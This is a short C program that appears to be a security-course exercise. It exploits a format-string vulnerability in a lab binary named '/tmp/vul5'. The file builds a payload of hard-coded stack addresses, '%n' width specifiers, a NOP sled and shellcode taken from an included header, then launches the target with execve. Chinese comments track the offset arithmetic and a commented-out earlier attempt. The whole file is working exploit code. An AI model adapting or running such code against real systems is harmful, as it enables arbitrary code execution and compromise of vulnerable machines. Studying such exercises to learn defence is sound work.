#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul5"

int main(void)
{
	char *addr;
	/* arg地址读错了
	addr = "\xff\xff\xff\xff\x2c\xfb\xff\xbf"
        "\xff\xff\xff\xff\x2d\xfb\xff\xbf"
        "\xff\xff\xff\xff\x2e\xfb\xff\xbf"
        "\xff\xff\xff\xff\x2f\xfb\xff\xbf" //前面32字节
        "%130u%n%92u%n%258u%n%192u%n"; //244+32=276=114=14，这里是10进制
		//32 244 233 258 192  258写成2会出错（可以gdb查看，不知道为什么）
		//   114 1fd 2ff 3bf
		//32+244+8+3=255 255+192=1BF，最后一字节写入BF。0xbffffd14
		*/
	addr = "\xff\xff\xff\xff\x2c\xfb\xff\xbf"
        "\xff\xff\xff\xff\x2d\xfb\xff\xbf"
        "\xff\xff\xff\xff\x2e\xfb\xff\xbf"
        "\xff\xff\xff\xff\x2f\xfb\xff\xbf" //前面32字节
        "%130u%n%92u%n%257u%n%192u%n";//0xbffffea2
  char payload[400];
  memset(payload,'\x90',400);
  payload[399] = '\x00';
  memcpy(payload, addr, strlen(addr));
  
  memcpy(payload +354, shellcode, 45);
	
	//char p[50]="hi"; //测试用的payload
	
  char *args[] = { TARGET,payload , NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
